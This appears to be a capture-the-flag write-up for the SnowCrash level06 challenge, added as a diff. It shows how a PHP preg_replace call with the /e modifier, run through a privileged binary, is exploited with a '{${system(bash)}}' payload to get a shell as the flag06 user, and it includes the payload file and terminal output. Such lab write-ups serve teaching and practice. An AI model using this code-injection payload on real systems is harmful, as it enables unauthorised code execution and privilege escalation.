@@ -1,0 +1,64 @@
+[x ${@system(bash)}]
+
+This level contain 2 file, a program named level06 and a php file named level06.php,
+like previous level, each file is owned by flag06 and if look the level06 dose (decompile it),
+we can see a earlier saw patern :
+"""
+    gid_t eax_6 = getegid();
+    uid_t eax_7 = geteuid();
+    setresgid(eax_6, eax_6, eax_6);
+    setresuid(eax_7, eax_7, eax_7);
+"""
+
+It is a privilege upgrade, it means that the program temporarely give itself flag06 privilege,
+so the first idea is to find a way to exploit it.
+
+If we try to execute ./level06, we obtain a message :
+PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
+
+We can found out 2 things :
+1 - level06 call level06.php and use what's inside.
+2 - apparently the program need a file as argument.
+
+With that in our mind, let's check what's inside level06.php.
+As we look this up, we can see a lot of 'preg_replace' call and a 'file_get_contents' that make the PHP Warning more understandable.
+Both of us dont know php really well, but we easely undesrstand that
+the most obvious way to exploit this code is by entering a file with a specific patern.
+
+By typing 'preg_replace exploit' in google, it seems that this function is known for his vulnerability.
+We found out in https://security.stackexchange.com/questions/151142/understanding-preg-replace-filtering-exploitation
+that "/(.*)/e" is dangerous in preg_replace because it can execute php code, and in level06.php, we have this line :
+"""
+$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+"""
+and more precisely :
+"""
+"/(\[x (.*)\])/e"
+"""
+it is really close to the formula we saw in the forum page.
+
+By reading the forum page we can understand that :
+"""
+preg_replace('/(.*)/e', 'func("\\x")', $input);
+"""
+is vulnerable and that an input such as '{${phpcmd}}' (see also https://wiki.php.net/rfc/remove_preg_replace_eval_modifier)
+can be dangerous and lead to 'phpcmd' execution, so commands like 'system()' can be use and that the execution of system(bash) is a possibility
+that should lead us to obtain a terminal inside flag06 user.
+
+Let's try it !
+
+We create a file :
+"""
+level06@SnowCrash:~$ cat /tmp/test
+([x {${system(bash)}}])
+"""
+we write inside of it '([x {${system(bash)}}])' because remember, level06.php dont have '/(.*)/e' but "/(\[x (.*)\])/e"
+
+And as we execute ./level06 /tmp/exploit :
+"""
+level06@SnowCrash:~$ ./level06 /tmp/test
+PHP Notice:  Use of undefined constant bash - assumed 'bash' in /home/user/level06/level06.php(4) : regexp code on line 1
+bash: /home/user/level06/.bashrc: Permission denied
+flag06@SnowCrash:~$ 
+"""
+we succesfully pop a terminal inside of flag06, we can obtain the flag by typing getflag !
